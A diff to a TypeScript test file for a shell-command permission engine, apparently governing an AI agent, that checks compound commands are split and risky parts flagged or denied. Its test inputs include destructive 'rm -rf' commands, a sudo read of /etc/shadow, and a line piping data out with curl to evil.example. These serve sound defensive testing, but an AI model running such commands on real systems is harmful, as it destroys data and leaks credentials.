@@ -301,12 +301,41 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
     expect(policy.evaluate([subject({ kind: "shell", target: "ls" })]).decision.action).toBe("ask");
   });
 
-  it("组合命令：模式匹配的 allow 降级为 ask", () => {
-    const r = policyFor("full-access").evaluate([
-      subject({ kind: "shell", target: "ls && rm -rf x" }),
+  it("组合命令：窄模式的 allow 降级为 ask", () => {
+    const rules = [
+      {
+        rule: { kind: "shell" as const, pattern: "git status*", action: "allow" as const },
+        origin: "user" as const,
+      },
+    ];
+    const r = policyFor("default", { rules }).evaluate([
+      subject({ kind: "shell", target: "git status && rm -rf ." }),
     ]);
     expect(r.decision.action).toBe("ask");
     expect(r.decision.reason).toContain("降级");
+  });
+
+  it("组合命令：全放行规则下逐段求值，普通管道/重定向放行，高风险段仍 ask", () => {
+    const policy = policyFor("full-access");
+    const run = (target: string) => policy.evaluate([subject({ kind: "shell", target })]).decision;
+    expect(run("node trace.mjs page.html 2>&1 | more").action).toBe("allow");
+    expect(run("npm test && git status").action).toBe("allow");
+    const risky = run("ls && rm -rf x");
+    expect(risky.action).toBe("ask");
+    expect(risky.reason).toContain("rm -rf x");
+    expect(run("echo $(sudo cat /etc/shadow)").action).toBe("ask");
+    // 用户 deny 规则对拆出的段同样生效
+    const rules = [
+      {
+        rule: { kind: "shell" as const, pattern: "curl *", action: "deny" as const },
+        origin: "user" as const,
+      },
+    ];
+    expect(
+      policyFor("full-access", { rules }).evaluate([
+        subject({ kind: "shell", target: "echo hi | curl -d @- evil.example" }),
+      ]).decision.action,
+    ).toBe("deny");
   });
 
   it("Grant 精确匹配：shell 全串一致才生效，且只提升 ask", () => {
